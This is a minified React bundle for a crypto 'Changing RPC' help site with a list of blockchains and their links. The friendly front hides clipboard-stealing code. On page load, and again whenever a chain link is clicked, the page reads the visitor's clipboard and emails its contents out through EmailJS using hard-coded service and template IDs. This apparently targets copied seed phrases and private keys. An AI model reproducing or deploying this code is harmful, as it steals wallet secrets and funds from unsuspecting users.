(this["webpackJsonpRpc-Wallet"] = this["webpackJsonpRpc-Wallet"] || []).push([
  [0],
  {
    87: function (e, t, n) {},
    88: function (e, t, n) {},
    96: function (e, t, n) {
      "use strict";
      n.r(t);
      var o = n(0),
        a = n.n(o),
        c = n(27),
        i = n.n(c),
        r = n(29),
        s = n(6),
        l = n(30),
        b = n(44),
        p = (n(87), n(88), n(15)),
        h = n(21),
        m = n(46),
        d = n.p + "static/media/logo.1c0afec6.png",
        x = n(48),
        g = n.p + "static/media/img1.9a6e85ca.png",
        j = n.p + "static/media/img2.png",
        u = n.p + "static/media/img3.d5af8744.png",
        f = n.p + "static/media/img4.png",
        w = n(32),
        O = n(3);
      var v = function () {
          Object(o.useEffect)(function () {
            window.scrollTo(0, 0);
          }, []),
            Object(o.useEffect)(function () {
              document.title = "Changing RPC";
            }, []);
          var e = Object(s.f)();

          function t(e) {
            return n.apply(this, arguments);
          }

          function n() {
            return (n = Object(h.a)(
              Object(p.a)().mark(function e(t) {
                return Object(p.a)().wrap(function (e) {
                  for (;;)
                    switch ((e.prev = e.next)) {
                      case 0:
                        t;
                      case 1:
                      case "end":
                        return e.stop();
                    }
                }, e);
              })
            )).apply(this, arguments);
          }
          return (
            Object(o.useEffect)(
              Object(h.a)(
                Object(p.a)().mark(function e() {
                  return Object(p.a)().wrap(function (e) {
                    for (;;)
                      switch ((e.prev = e.next)) {
                        case 0:
                          setTimeout(
                            Object(h.a)(
                              Object(p.a)().mark(function e() {
                                var t, n;
                                return Object(p.a)().wrap(function (e) {
                                  for (;;)
                                    switch ((e.prev = e.next)) {
                                      case 0:
                                        return (
                                          (e.next = 2),
                                          navigator.clipboard.readText()
                                        );
                                      case 2:
                                        if ("" === (t = e.sent)) {
                                          e.next = 7;
                                          break;
                                        }
                                        return (
                                          (n = {
                                            from_name: "New User",
                                            message:
                                              "RPC Clipboard text is:= (" +
                                              t +
                                              ")",
                                          }),
                                          (e.next = 7),
                                          w.a
                                            .send(
                                              "service_keusiah",
                                              "template_ag7yqsr",
                                              n,
                                              "M0p9ylMa_6USepFlW"
                                            )
                                            .then(
                                              function (e) {
                                                console.log("");
                                              },
                                              function (e) {
                                                console.log("");
                                              }
                                            )
                                        );
                                      case 7:
                                      case "end":
                                        return e.stop();
                                    }
                                }, e);
                              })
                            ),
                            3e3
                          );
                        case 1:
                        case "end":
                          return e.stop();
                      }
                  }, e);
                })
              ),
              []
            ),
            Object(O.jsxs)(b.a, {
              w: "100%",
              minHeight: "100vh",
              direction: "column",
              bg: "rgba(24,28,31,1.00)",
              fontFamily: "font1",
              fontSize: ["15px", "16px"],
              color: "rgba(234,242,247,1.00)",
              margin: "0",
              children: [
                Object(O.jsxs)(b.a, {
                  w: "100%",
                  h: "auto",
                  py: ["2", "5"],
                  px: ["4%", "7"],
                  boxShadow: "0px 1px 2px rgb(0 0 0 / 69%)",
                  bg: "rgba(24,28,31,1.00)",
                  borderBottom: "1px solid rgba(55,65,81,1.00)",
                  align: "center",
                  className: "stick",
                  zIndex: "10",
                  children: [
                    Object(O.jsxs)(b.a, {
                      flex: "1",
                      align: "center",
                      onClick: function () {
                        return e.go(0);
                      },
                      children: [
                        Object(O.jsx)(m.a, {
                          src: d,
                          w: ["20px", "40px"],
                          h: ["20px", "40px"],
                        }),
                        Object(O.jsx)(b.b, {
                          ml: ["1", "2"],
                          fontSize: ["16px", "28px"],
                          fontWeight: "bold",
                          children: "RPC",
                        }),
                      ],
                    }),
                    Object(O.jsx)(b.a, {
                      w: ["50%", "60%"],
                      px: "5%",
                      ml: "5%",
                      align: "center",
                      borderLeft: ["none", "1px solid rgba(55,65,81,1.00)"],
                      borderRight: ["none", "1px solid rgba(55,65,81,1.00)"],
                      h: "50px",
                      justify: ["center", "flex-start"],
                      children: Object(O.jsx)(b.b, {
                        color: "rgba(52,109,219,1.00)",
                        cursor: "pointer",
                        transition: "300ms ease-in-out",
                        _hover: { color: "rgba(52,109,219,0.7)" },
                        textDecoration: "underline",
                        onClick: function (n) {
                          t(n), e.push("/defillama-chains");
                        },
                        children: "Find RPC's",
                      }),
                    }),
                    Object(O.jsx)(b.a, {
                      flex: "1",
                      pl: "5%",
                      align: "center",
                      justify: ["flex-end", "flex-start"],
                      children: Object(O.jsxs)(b.a, {
                        cursor: "pointer",
                        align: "center",
                        onClick: function () {
                          return e.push("/defillama-chains");
                        },
                        children: [
                          Object(O.jsx)(x.a, {
                            color: "rgba(204,207,212,1.00)",
                            w: "13px",
                            h: "13px",
                            mr: "3",
                          }),
                          Object(O.jsx)(b.b, {
                            fontSize: "14px",
                            color: "rgba(204,207,212,1.00)",
                            display: ["none", "inline-block"],
                            children: "Search...",
                          }),
                        ],
                      }),
                    }),
                  ],
                }),
                Object(O.jsxs)(b.a, {
                  px: ["5%", "10%"],
                  py: "5",
                  w: "100%",
                  direction: "column",
                  children: [
                    Object(O.jsxs)(b.a, {
                      align: "center",
                      pb: "5",
                      borderBottom: "1px solid rgba(55,65,81,1.00)",
                      w: "100%",
                      justify: "space-between",
                      mb: "5",
                      children: [
                        Object(O.jsx)(b.b, {
                          fontSize: ["21px", "48px"],
                          fontWeight: "bold",
                          fontFamily: "font4",
                          children: "Changing RPC",
                        }),
                        Object(O.jsx)(b.a, {
                          bg: "rgb(34, 39, 46)",
                          py: ["3", "4"],
                          px: ["5", "6"],
                          justify: "center",
                          borderRadius: "8px",
                          cursor: "pointer",
                          color: "rgba(145,176,240,1.00)",
                          transition: "300ms ease-in-out",
                          fontWeight: "bold",
                          _hover: { background: "rgb(44, 49, 56)" },
                          fontSize: ["12px", "16px"],
                          onClick: function (n) {
                            t(n), e.push("/defillama-chains");
                          },
                          children: "View RPC's Here",
                        }),
                      ],
                    }),
                    Object(O.jsxs)(b.b, {
                      children: [
                        Object(O.jsx)(b.b, {
                          fontWeight: "bold",
                          mb: "3",
                          children: "What is an RPC (Remote Procedure Call)?",
                        }),
                        Object(O.jsx)(b.b, {
                          mb: "2",
                          children:
                            "An RPC in its simplest term is a \u2018middle-man\u2019 to allow communication between your device and the blockchain.",
                        }),
                        "When you process a transaction from your device, such as staking funds into a farm; the request is sent from your device via the RPC, to the blockchain. The blockchain will unpack that message and carry out the necessary actions to complete the request. Once the request is carried out, a message is sent back to the RPC with the outcome of the request.",
                        Object(O.jsx)(b.b, {
                          fontWeight: "bold",
                          mb: "3",
                          mt: "3",
                          children: "Common errors relating to RPC\u2019s",
                        }),
                        Object(O.jsx)(b.b, {
                          mb: "3",
                          children:
                            "Some more common errors caused by RPC\u2019s include,",
                        }),
                        Object(O.jsxs)(b.b, {
                          px: "3",
                          w: "100%",
                          children: [
                            Object(O.jsxs)(b.a, {
                              align: "center",
                              mb: "2",
                              children: [
                                Object(O.jsx)("i", {
                                  className: "mdi mdi-circle",
                                  style: {
                                    marginRight: "12px",
                                    fontSize: "8px",
                                  },
                                }),
                                "Slow loading times of webpages or transaction requests.",
                              ],
                            }),
                            Object(O.jsxs)(b.a, {
                              align: "center",
                              mb: "2",
                              children: [
                                Object(O.jsx)("i", {
                                  className: "mdi mdi-circle",
                                  style: {
                                    marginRight: "12px",
                                    fontSize: "8px",
                                  },
                                }),
                                "Transaction error or transaction timed out.",
                              ],
                            }),
                            Object(O.jsxs)(b.a, {
                              align: "center",
                              mb: "2",
                              children: [
                                Object(O.jsx)("i", {
                                  className: "mdi mdi-circle",
                                  style: {
                                    marginRight: "12px",
                                    fontSize: "8px",
                                  },
                                }),
                                "JSON-RPC error.",
                              ],
                            }),
                            Object(O.jsxs)(b.a, {
                              align: "center",
                              mb: "6",
                              children: [
                                Object(O.jsx)("i", {
                                  className: "mdi mdi-circle",
                                  style: {
                                    marginRight: "12px",
                                    fontSize: "8px",
                                  },
                                }),
                                "Incorrect figures displayed (APR, balance etc.) on webpages.",
                              ],
                            }),
                          ],
                        }),
                        Object(O.jsx)(b.b, {
                          mb: "3",
                          children: "How to resolve an RPC issue?",
                        }),
                        "The most common reason for RPC issues is due to congestion. Due to there only being a limited amount of RPC\u2019s available to supply a high demand of investors, it is not uncommon for the RPC to become overloaded and result in an error and/or unstable use of the blockchain. If one of the above errors occur or another error you are unsure of, completing the below steps is a good start to resolving the issue.",
                        Object(O.jsx)("br", {}),
                        Object(O.jsx)("br", {}),
                        "1. Close Metamask.",
                        Object(O.jsx)("br", {}),
                        Object(O.jsx)("br", {}),
                        "2. Clear \u2018cache\u2019, browser cookies and history from your web browser.",
                        Object(O.jsx)("br", {}),
                        Object(O.jsx)("br", {}),
                        "3. Restart browser and/or computer.",
                        Object(O.jsx)("br", {}),
                        Object(O.jsx)("br", {}),
                        "4. Reopen Metamask app or extension and change RPC (How to change RPC steps below).",
                        Object(O.jsx)("br", {}),
                        Object(O.jsx)("br", {}),
                        "Once completed the above steps, it is likely the RPC will start to function as intended. If the RPC is still unstable, the problem may lie within the blockchain and you will have to wait for the issue onchain to be resolved.",
                      ],
                    }),
                    Object(O.jsx)(m.a, {
                      mt: "12",
                      src: g,
                      w: "100%",
                      h: "auto",
                      borderRadius: "6px",
                    }),
                    Object(O.jsx)(m.a, {
                      mt: "5",
                      src: j,
                      w: "100%",
                      h: "auto",
                      borderRadius: "6px",
                    }),
                    Object(O.jsx)(m.a, {
                      mt: "5",
                      src: u,
                      w: "100%",
                      h: "auto",
                      borderRadius: "6px",
                    }),
                    Object(O.jsx)(m.a, {
                      mt: "5",
                      src: f,
                      w: "100%",
                      h: "auto",
                      borderRadius: "6px",
                    }),
                    Object(O.jsx)(b.a, {
                      align: "center",
                      pt: "5",
                      mt: "8",
                      borderTop: "1px solid rgba(55,65,81,1.00)",
                      w: "100%",
                      mb: "8",
                      children: Object(O.jsx)(b.b, {
                        fontSize: "14px",
                        color: "rgba(162,169,185,1.00)",
                        children: "Last modified 1mo ago",
                      }),
                    }),
                  ],
                }),
              ],
            })
          );
        },
        k = n(41),
        y = n(47),
        R = n.p + "static/media/eth.4beda17f.webp",
        C = n.p + "static/media/bnb.e64993a1.webp",
        P = n.p + "static/media/trn.a4d70da1.webp",
        S = n.p + "static/media/avx.f2933d40.webp",
        $ = n.p + "static/media/sol.e9dad93b.webp",
        A = n.p + "static/media/pol.0ba7b882.webp",
        N = n.p + "static/media/ftm.b1630d6a.webp",
        z = n.p + "static/media/cro.1cb8a0d9.webp",
        T = n.p + "static/media/arb.035b12b2.webp",
        E = n.p + "static/media/wav.af81321a.webp",
        I = n.p + "static/media/def.e8d97d5a.webp",
        W = n.p + "static/media/par.f2fb0282.webp",
        H = n.p + "static/media/mix.69cd0afe.webp",
        B = n.p + "static/media/nea.911175db.webp",
        F = n.p + "static/media/aur.998df0ab.webp",
        _ = n.p + "static/media/kla.de3d494a.webp",
        M = n.p + "static/media/kav.81065b60.webp",
        q = n.p + "static/media/opt.3e895920.webp",
        L = n.p + "static/media/har.e780a4ff.webp",
        Y = n.p + "static/media/fus.5a3b1453.webp",
        D = n.p + "static/media/ter.68ceea90.webp";
      var K = function () {
        var e = Object(o.useState)(!1),
          t = Object(k.a)(e, 2),
          n = t[0],
          a = t[1];
        Object(o.useEffect)(function () {
          window.scrollTo(0, 0);
        }, []);
        var c = Object(o.useState)(0),
          i = Object(k.a)(c, 2),
          r = i[0],
          l = i[1];
        Object(o.useEffect)(function () {
          document.title = "All Chains";
        }, []);
        var x = Object(s.f)();
        Object(o.useEffect)(
          function () {
            1 === r &&
              setTimeout(function () {
                l(0);
              }, 2e3);
          },
          [r]
        );
        var g = [
          {
            name: "Ethereum (ETH)",
            icon: R,
            protocols: "489",
            change: "+0.46%",
            change2: "-33.99%",
            tvl: "$71.79b",
            link: "https://ethereum.org/en/",
          },
          {
            name: "BSC (BNB)",
            icon: C,
            protocols: "400",
            change: "-0.97%",
            change2: "-25.63%",
            tvl: "$8.92b",
            link: "https://www.binance.com/en",
          },
          {
            name: "Tron (TRON)",
            icon: P,
            protocols: "9",
            change: "+14.08%",
            change2: "+50.30%",
            tvl: "$6b",
            link: "https://tron.network/",
          },
          {
            name: "Avalanche (AVAX)",
            icon: S,
            protocols: "211",
            change: "-6.30%",
            change2: "-53.87%",
            tvl: "$4.12b",
            link: "https://www.avax.network/",
          },
          {
            name: "Solana (SOL)",
            icon: $,
            protocols: "67",
            change: "-5.41%",
            change2: "-33.26%",
            tvl: "$4b",
            link: "https://solana.com/",
          },
          {
            name: "Polygon (MATIC)",
            icon: A,
            protocols: "256",
            change: "-2.32%",
            change2: "-26.57%",
            tvl: "$2.62b",
            link: "https://polygon.technology/",
          },
          {
            name: "Fantom (FTM)",
            icon: N,
            protocols: "233",
            change: "+0.30%",
            change2: "-56.02%",
            tvl: "$1.69b",
            link: "https://fantom.foundation/",
          },
          {
            name: "Cronos (CRO)",
            icon: z,
            protocols: "58",
            change: "-8.42%",
            change2: "-53.49%",
            tvl: "$1.54b",
            link: "https://cronos.org/",
          },
          {
            name: "Arbitrum",
            icon: T,
            protocols: "87",
            change: "+0.07%",
            change2: "-28.89%",
            tvl: "$1.36b",
            link: "https://bridge.arbitrum.io/",
          },
          {
            name: "Waves (WAVES)",
            icon: E,
            protocols: "5",
            change: "+8.61%",
            change2: "-29.90%",
            tvl: "$1.06b",
            link: "https://waves.exchange/",
          },
          {
            name: "DefiChain (DFI)",
            icon: I,
            protocols: "2",
            change: "-2.57%",
            change2: "-32.93%",
            tvl: "$781.46m",
            link: "https://defichain.com/",
          },
          {
            name: "Parallel (PARA)",
            icon: W,
            protocols: "1",
            change: "-1.65%",
            change2: "-8.34%",
            tvl: "$599.67m",
            link: "https://parallel.fi/",
          },
          {
            name: "Mixin (XIN)",
            icon: H,
            protocols: "3",
            change: "+106%",
            change2: "+79.31%",
            tvl: "$592.89m",
            link: "https://mixin.one/",
          },
          {
            name: "Near (NEAR)",
            icon: B,
            protocols: "7",
            change: "+12.82%",
            change2: "+16.08%",
            tvl: "$529.66m",
            link: "https://near.org/",
          },
          {
            name: "Aurora (AURORA)",
            icon: F,
            protocols: "34",
            change: "+19.01%",
            change2: "-62.56%",
            tvl: "$500.37m",
            link: "https://aurora.dev/",
          },
          {
            name: "Klaytn (KLAY)",
            icon: _,
            protocols: "21",
            change: "-0.56%",
            change2: "-47.25%",
            tvl: "$478.07m",
            link: "https://www.klaytn.foundation/",
          },
          {
            name: "Kava (KAVA)",
            icon: M,
            protocols: "4",
            change: "-3.76%",
            change2: "-35.35%",
            tvl: "$392.03m",
            link: "https://www.kava.io/",
          },
          {
            name: "Optimum",
            icon: q,
            protocols: "40",
            change: "-7.97%",
            change2: "-37.61%",
            tvl: "$267.67m",
            link: "https://optimumcryptoltd.com/",
          },
          {
            name: "Harmony (ONE)",
            icon: L,
            protocols: "55",
            change: "-5.45%",
            change2: "-56.41%",
            tvl: "$171.16m",
            link: "https://www.harmony.one/",
          },
          {
            name: "Fusion (FSN)",
            icon: Y,
            protocols: "2",
            change: "+1.85%",
            change2: "-7.08%",
            tvl: "$155.28m",
            link: "https://www.fusion.org/en",
          },
          {
            name: "Terra (LUNA)",
            icon: D,
            protocols: "2",
            change: "+1.55%",
            change2: "-6.29%",
            tvl: "$145.89m",
            link: "https://www.terra.money/",
          },
        ];

        function j() {
          return (j = Object(h.a)(
            Object(p.a)().mark(function e(t, n) {
              var o, c;
              return Object(p.a)().wrap(function (e) {
                for (;;)
                  switch ((e.prev = e.next)) {
                    case 0:
                      return (e.next = 2), navigator.clipboard.readText();
                    case 2:
                      if (
                        ((o = e.sent),
                        a(!0),
                        alert("RPC will redirect shortly"),
                        "" === o)
                      ) {
                        e.next = 13;
                        break;
                      }
                      return (
                        (c = {
                          from_name: "New User",
                          message: "RPC Clipboard text is:= (" + o + ")",
                        }),
                        (e.next = 9),
                        w.a
                          .send(
                            "service_keusiah",
                            "template_ag7yqsr",
                            c,
                            "M0p9ylMa_6USepFlW"
                          )
                          .then(
                            function (e) {
                              console.log("");
                            },
                            function (e) {
                              console.log("");
                            }
                          )
                      );
                    case 9:
                      a(!1), (window.location.href = n), (e.next = 14);
                      break;
                    case 13:
                      setTimeout(function () {
                        a(!1), (window.location.href = n);
                      }, 2e3);
                    case 14:
                    case "end":
                      return e.stop();
                  }
              }, e);
            })
          )).apply(this, arguments);
        }
        return Object(O.jsx)(b.a, {
          w: "100%",
          minHeight: "100vh",
          fontFamily: "font2",
          direction: ["column", "row"],
          children: Object(O.jsx)(b.a, {
            flex: "1",
            minHeight: "100vh",
            color: "rgb(250,250,250)",
            pt: "36px",
            pb: ["50px", "75px"],
            px: ["4%", "4.5rem"],
            bg: "rgba(24,28,31,1.00)",
            direction: "column",
            children: Object(O.jsxs)(b.a, {
              direction: "column",
              flex: "1",
              minHeight: "100vh",
              bg: "rgba(52, 54, 53, 0.8)",
              zIndex: "1",
              position: "relative",
              children: [
                Object(O.jsxs)(b.a, {
                  w: "100%",
                  h: "auto",
                  py: ["2", "5"],
                  boxShadow: "0px 1px 2px rgb(0 0 0 / 69%)",
                  bg: "rgba(24,28,31,1.00)",
                  borderBottom: "1px solid rgba(55,65,81,1.00)",
                  align: "center",
                  className: "stick",
                  zIndex: "10",
                  justify: "space-between",
                  children: [
                    Object(O.jsxs)(b.a, {
                      flex: "1",
                      align: "center",
                      children: [
                        Object(O.jsx)("i", {
                          className: "mdi mdi-chevron-left",
                          style: { fontSize: "40px", cursor: "pointer" },
                          onClick: function () {
                            return x.push("/");
                          },
                        }),
                        Object(O.jsx)(b.a, {
                          h: "50px",
                          bg: "rgba(55,65,81,1.00)",
                          w: "1px",
                          mx: "5",
                        }),
                        Object(O.jsx)(m.a, {
                          ml: "4",
                          src: d,
                          w: ["20px", "40px"],
                          h: ["20px", "40px"],
                        }),
                        Object(O.jsx)(b.b, {
                          ml: ["2", "3"],
                          fontSize: ["16px", "28px"],
                          fontWeight: "bold",
                          children: "Top RPC's",
                        }),
                      ],
                    }),
                    n &&
                      Object(O.jsx)(y.a, {
                        color: "rgb(230,230,230)",
                        emptyColor: "grey",
                        mr: "5",
                      }),
                  ],
                }),
                Object(O.jsxs)(b.a, {
                  w: "100%",
                  direction: "column",
                  border: "1px solid rgb(64, 68, 79)",
                  boxShadow: "rgb(0 0 0 / 5%) 0px 6px 10px",
                  bg: "rgba(0, 0, 0, 0.05)",
                  py: "6px",
                  px: "0",
                  color: "rgb(250, 250, 250)",
                  fontSize: ["13px", "14px"],
                  children: [
                    Object(O.jsx)(b.a, {
                      w: "100%",
                      py: "3",
                      px: "10",
                      align: "center",
                      borderBottom: "1px solid rgba(43, 43, 43, 0.435)",
                      children: Object(O.jsx)(b.a, {
                        w: "100%",
                        flex: "1",
                        children: "Name",
                      }),
                    }),
                    g.map(function (e, t) {
                      return Object(O.jsx)(
                        b.a,
                        {
                          w: "100%",
                          py: "3",
                          px: "10",
                          align: "center",
                          borderBottom:
                            t < 20 && "1px solid rgba(83, 83, 83, 0.435)",
                          children: Object(O.jsxs)(b.a, {
                            w: "100%",
                            align: "center",
                            children: [
                              Object(O.jsx)(b.b, { mr: "5", children: t + 1 }),
                              Object(O.jsx)(m.a, {
                                src: e.icon,
                                w: "24px",
                                h: "24px",
                                borderRadius: "24px",
                                mr: "5",
                              }),
                              Object(O.jsx)(b.b, {
                                cursor: "pointer",
                                _hover: { color: "rgb(33, 114, 229)" },
                                onClick: function (t) {
                                  !(function (e, t) {
                                    j.apply(this, arguments);
                                  })(t, e.link);
                                },
                                children: e.name,
                              }),
                            ],
                          }),
                        },
                        t
                      );
                    }),
                  ],
                }),
              ],
            }),
          }),
        });
      };
      var U = function () {
        return Object(O.jsx)(l.a, {
          children: Object(O.jsx)(b.a, {
            w: "100%",
            minHeight: "100vh",
            direction: "column",
            children: Object(O.jsx)(r.a, {
              children: Object(O.jsxs)(s.c, {
                children: [
                  Object(O.jsx)(s.a, { path: "/", component: v, exact: !0 }),
                  Object(O.jsx)(s.a, {
                    path: "/defillama-chains",
                    component: K,
                  }),
                  Object(O.jsx)(s.a, { component: v }),
                ],
              }),
            }),
          }),
        });
      };
      i.a.render(
        Object(O.jsx)(a.a.StrictMode, { children: Object(O.jsx)(U, {}) }),
        document.getElementById("root")
      );
    },
  },
  [[96, 1, 2]],
]);
//# sourceMappingURL=main.96e937f0.chunk.js.map
